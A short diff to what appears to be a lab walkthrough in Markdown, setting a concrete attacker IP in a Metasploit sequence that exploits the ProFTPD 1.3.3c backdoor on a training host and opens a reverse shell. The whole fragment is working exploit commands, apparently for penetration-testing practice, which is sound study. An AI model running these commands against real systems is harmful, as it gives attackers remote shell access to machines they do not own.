@@ -42,7 +42,7 @@ msfconsole -q
 use exploit/unix/ftp/proftpd_133c_backdoor
 set payload payload/cmd/unix/reverse
 set RHOSTS demo.ine.local
-set LHOST <attacker_ip>
+set LHOST 10.4.19.44
 exploit -z
 ```
 
